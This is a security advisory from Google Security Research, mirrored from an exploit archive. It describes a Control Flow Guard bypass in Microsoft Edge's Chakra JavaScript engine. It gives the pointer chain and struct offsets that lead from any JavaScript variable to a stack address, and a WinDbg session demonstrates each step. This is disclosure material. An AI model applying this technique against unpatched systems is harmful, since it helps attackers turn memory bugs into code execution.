@@ -1,0 +1,111 @@
+id: 29125
+date: 12/06/2017
+title: Microsoft Edge Chakra CFG Bypass With leafInterpreterFrame Vulnerability
+author: Google Security Research
+cves: 
+
+Chakra: CFG bypass with leafInterpreterFrame 
+
+
+
+
+This is quite a straightforward CFG bypass and I'm not sure Microsoft cares about bypasses like this, but I didn't see it anywhere else and I think it is quite practical because:
+ - There is no need to call any function to e.g. leak stack address. Just an arbitrary read (followed by a single write) is sufficient.
+ - The starting point for the arbitrary read can be any JavaScript variable which seems quite easy to find.
+
+Details: Every JavaScript variable in Chakra (except a tagged int) is a pointer. From this pointer, using an arbitrary read, it is possible to follow a chain of pointers and end up with a pointer to the native stack. This allows disclosing the stack location and subsequently overwriting a return address on the stack leading to CFG bypass.
+
+The chain of pointers to follow is
+(RecyclableObject *)Var->type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame
+Note that other variable inside ThreadContext also contain stack pointers such as entryExitRecord and stackLimitForCurrentThread
+
+See the debug log below for a demonstration.
+
+# We're breaking right before calling JavascriptConversion::ToNumber to be able to inspect a var, but in a real-world exploit scenario an attacker shouldn't have any trouble locating a var (any that is not a tagged int will do). Our var is in rcx.
+
+0:019> r
+rax=000000d3f47fc190 rbx=000002009da3e000 rcx=000002009da29380
+rdx=0000020096e2cff0 rsi=000000d3f47fc558 rdi=000002009da3e000
+rip=00007ffc8cc1d4a3 rsp=000000d3f47fc140 rbp=000000d3f47fc1a8
+ <a href="https://crrev.com/8" title="" class="" rel="nofollow">r8</a>=000000d3f47fc160  <a href="https://crrev.com/9" title="" class="" rel="nofollow">r9</a>=000000d3f47fc188 <a href="https://crrev.com/10" title="" class="" rel="nofollow">r10</a>=000002009da3dfc0
+<a href="https://crrev.com/11" title="" class="" rel="nofollow">r11</a>=000000d3f47fc268 <a href="https://crrev.com/12" title="" class="" rel="nofollow">r12</a>=000002009da3e000 <a href="https://crrev.com/13" title="" class="" rel="nofollow">r13</a>=000000d3f47fc558
+<a href="https://crrev.com/14" title="" class="" rel="nofollow">r14</a>=0000000000000002 <a href="https://crrev.com/15" title="" class="" rel="nofollow">r15</a>=00007ffc8cc1d420
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+chakra!Js::Math::Acos+0x83:
+00007ffc`8cc1d4a3 e858fb1800      call    chakra!Js::JavascriptConversion::ToNumber (00007ffc`8cdad000)
+
+# Below is our var, the first qword is a vtable ptr, the second one is "type" ptr. Let's follow that.
+
+0:019> dq 000002009da29380
+00000200`9da29380  00007ffc`8d158e70 00000200`9da0a000
+00000200`9da29390  00000000`00000000 00000000`00000000
+00000200`9da293a0  00000000`00000000 00000000`00000000
+00000200`9da293b0  00000000`00000000 00000000`00000000
+00000200`9da293c0  00000000`00000000 00000000`00000000
+00000200`9da293d0  00000000`00000000 00000000`00000000
+00000200`9da293e0  00000000`00000000 00000000`00000000
+00000200`9da293f0  00000000`00000000 00000000`00000000
+
+# 00000200`9da10000 is the javascriptLibrary ptr. Follow that.
+
+0:019> dq 000002009da0a000
+00000200`9da0a000  00000000`0000001b 00000200`9da10000
+00000200`9da0a010  00000200`9d9f4180 00007ffc`8ce3d980
+00000200`9da0a020  00000000`00000000 00000200`9d9f49f0
+00000200`9da0a030  00000000`00000101 00000000`00000000
+00000200`9da0a040  00007ffc`8d1576c0 00000002`00201d51
+00000200`9da0a050  00000000`00020001 00000200`9da24000
+00000200`9da0a060  00000000`00000000 00000000`00000000
+00000200`9da0a070  00000000`00000000 00000000`00000000
+
+# At 00000200`9da10000 + offset 0x430 we should find a scriptContext ptr
+
+0:019> dq 00000200`9da10000+430
+00000200`9da10430  00000200`96e2cff0 00000200`9da4c000
+00000200`9da10440  00000200`96e2d9d0 00000200`9da50000
+00000200`9da10450  00000200`9da20000 00000200`9da0ae80
+00000200`9da10460  00000200`9da08080 00000200`9da08d80
+00000200`9da10470  00000200`9da08e00 00000200`9da08e80
+00000200`9da10480  00000200`9da08f00 00000200`9da09080
+00000200`9da10490  00000200`9da08f80 00000200`9da09000
+00000200`9da104a0  00000000`00000000 00000200`9da09100
+
+# ... and following that on offset 0x5c0 there should be a threadContext ptr
+
+0:019> dq 0000020096e2cff0+5c0
+00000200`96e2d5b0  00000200`96e2a000 00000000`00001248
+00000200`96e2d5c0  00000200`9d9c4030 00000200`9d9c4050
+00000200`96e2d5d0  00000200`9d9bf080 00000200`9d9bf0b0
+00000200`96e2d5e0  00000000`00000000 00000000`00000000
+00000200`96e2d5f0  00000200`9d9c5030 00000000`00000000
+00000200`96e2d600  00000000`00000000 00000200`9d9bf0e0
+00000200`96e2d610  00000200`96e2d9d0 00000000`00000000
+00000200`96e2d620  00000000`00000000 00000000`00000000
+
+# ... and then at offset 0x8a0 and 0x8a8 you'll see some pointers to the stack (compare with rsp in the register listing below)
+
+0:019> dq 00000200`96e2a000+8a0
+00000200`96e2a8a0  000000d3`f47fc8c0 000000d3`f47fc3e0
+00000200`96e2a8b0  00000000`00000000 00000000`00000000
+00000200`96e2a8c0  00000000`00000000 00000000`00000000
+00000200`96e2a8d0  00000000`00000000 00000000`00000000
+00000200`96e2a8e0  00000000`00000000 00000000`00000000
+00000200`96e2a8f0  00000000`00000000 00000000`00000000
+00000200`96e2a900  00000000`00000000 00000000`00000000
+00000200`96e2a910  00000000`00000000 00000000`00000000
+
+0:019> r
+rax=000000d3f47fc190 rbx=000002009da3e000 rcx=000002009da29380
+rdx=0000020096e2cff0 rsi=000000d3f47fc558 rdi=000002009da3e000
+rip=00007ffc8cc1d4a3 rsp=000000d3f47fc140 rbp=000000d3f47fc1a8
+ <a href="https://crrev.com/8" title="" class="" rel="nofollow">r8</a>=000000d3f47fc160  <a href="https://crrev.com/9" title="" class="" rel="nofollow">r9</a>=000000d3f47fc188 <a href="https://crrev.com/10" title="" class="" rel="nofollow">r10</a>=000002009da3dfc0
+<a href="https://crrev.com/11" title="" class="" rel="nofollow">r11</a>=000000d3f47fc268 <a href="https://crrev.com/12" title="" class="" rel="nofollow">r12</a>=000002009da3e000 <a href="https://crrev.com/13" title="" class="" rel="nofollow">r13</a>=000000d3f47fc558
+<a href="https://crrev.com/14" title="" class="" rel="nofollow">r14</a>=0000000000000002 <a href="https://crrev.com/15" title="" class="" rel="nofollow">r15</a>=00007ffc8cc1d420
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
+
+#  0day.today [2023-03-22]  #
